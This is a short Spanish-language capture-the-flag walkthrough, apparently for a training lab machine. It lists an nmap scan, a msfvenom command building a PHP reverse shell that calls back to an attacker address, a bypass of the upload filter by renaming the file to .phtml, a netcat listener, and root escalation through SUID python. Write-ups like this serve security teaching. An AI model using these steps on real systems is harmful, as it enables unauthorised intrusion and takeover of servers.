
Hacemos un reconocimiento básico con [[NMAP]]
`nmap -p- --open -sSCV  --min-rate 5000 -n -Pn 10.10.161.152 -oN ScanPorts.txt`

Encontramos levantado los puertos `22 SSH` y `80 HTTP` corriendo un servicio Apache.
Navegamos a la web del puerto `80`

Con [[DIRBUSTER]] Encontramos el directorio `/panel/index.php` en el cual se pueden subir archivos, probaremos a subir un archivo con una reverse shell `.php`

Creamos la shell con [[MSFVENOM]]
`msfvenom -p php/reverse_php LHOST=10.8.28.111 LPORT=443 -f raw > shell.php`

Lo subimos pero como no acepta `.php` lo cambiamos a `.phtml` una vez subido duirante el reconocimiento con [[DIRBUSTER]] encontramos el directorio `/uploads` navegamos a el y ejecutamos el archivo subido y nos ponemos en escucha con [[NETCAT]]
`nc -lvnp 443 `

Una vez que tenemos conexión la estabilizamos y hacemos el [[01. Tratamiento de la TTY]]
Navegando por los directorios hacia atrás encontramos en `/var/www` la primera flag del usuario.
Para la escalada de privilegios usamos ` find / -perm -4000 2>/dev/null` y vemos que aparece `/usr/bin/python`, en GTFobins podemos encontrar esta escalada, y obtendremos una shell como root y en el directorio `/root` encontramos la frag.
